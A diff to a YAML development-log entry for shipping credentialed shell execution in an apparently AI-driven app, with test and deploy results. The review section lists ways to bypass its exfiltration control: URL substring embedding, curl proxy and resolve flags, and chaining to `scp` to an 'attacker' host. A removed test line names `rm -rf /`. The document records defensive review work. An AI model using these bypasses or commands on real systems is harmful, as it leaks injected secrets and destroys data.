@@ -2,7 +2,7 @@
 title: Credentialed, self-installing native exec (Cycle B3.2) — exec turned back on
 cycle: 35 (B3.2)
 date: 2026-06-20
-status: shipped + deployed (live credentialed E2E pending Tony's PAT)
+status: shipped + deployed + credentialed E2E verified (2026-06-22)
 branch: b3-2-credentialed-exec (merged to master, FF 88a0ca0..5a4dd87, 13 commits)
 task: d1d7f0ab (Cycle B)
 spec: ../superpowers/specs/2026-06-20-credentialed-native-exec-b3-2-design.md
@@ -21,7 +21,7 @@ shipped:
 validation:
   - "**Gates (branch HEAD 5a4dd87):** typecheck clean, **588 tests pass**, build complete."
   - "**Deploy GREEN** (run 27887712959, master 5a4dd87) — DB-touching `/api/health` gate passed. App live as root (native-root). `/api/settings/exec-secrets` unauth → 401 (shipped + auth-gated). `/opt/mymind/workspace` present. exec dark (no secrets, cookie off)."
-  - "**Pending — Tony's interactive E2E** (needs a real GitHub PAT + the UI): seed `GITHUB_TOKEN` at /settings→Secrets; arm exec (powerful profile + `Exec enabled` toggle); `gh repo list` (private) succeeds via injected token; `curl http://192.168.2.25:8004/v1/models` runs with NO prompt (LAN); a new external host prompts + binds per-host; `/activity` shows commands with secret values redacted; toggle off disables exec; `rm -rf /` refused."
+  - "**Tony's interactive E2E — VERIFIED (2026-06-22):** seeded `GITHUB_TOKEN` at /settings→Secrets; armed exec (powerful profile + `Exec enabled` toggle); `gh` private-repo access via injected token works; token redaction confirmed. Credentialed exec working well in prod. Closes the last open item on Cycle 35."
 review:
   - "Subagent-driven (8 tasks, fresh implementer+reviewer each). Final whole-branch review (opus) caught the load-bearing exfil control being unsound: glob host-scoping → substring-embedding bypass (`curl …/https://api.github.com/`), then host-set membership → STILL bypassable via curl proxy/`--connect-to`/`--resolve` flags + shell-chaining (`curl approved && scp … attacker`)."
 decisions:
